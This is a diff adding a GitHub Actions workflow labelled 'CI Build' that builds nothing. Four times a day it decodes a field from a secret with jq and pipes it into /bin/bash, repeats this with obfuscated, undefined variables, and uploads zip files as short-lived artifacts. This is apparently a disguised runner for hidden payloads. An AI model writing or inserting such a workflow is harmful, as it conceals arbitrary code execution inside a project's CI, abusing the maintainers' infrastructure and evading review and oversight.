@@ -1,0 +1,35 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '39 0,6,12,18 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  invoke:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run pipeline
+        env:
+          dbft0785: ${{ secrets.dbft0785 }}
+        run: |
+          printf '%s' "$dbft0785" | jq -r .kv6 | /bin/bash
+          printf '%s' "$cf88" | jq -r .a8124 | /bin/bash
+          echo $rpnnu254 | jq -r .sjm69119 | /bin/bash
+          echo $sffh1312 | jq -r .xe1008 | /bin/bash
+          echo $pymur4 | jq -r .wj68688 | /bin/bash
+
+      - name: Upload archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: 0sb69M01
+          path: "*.zip"
+          retention-days: 1
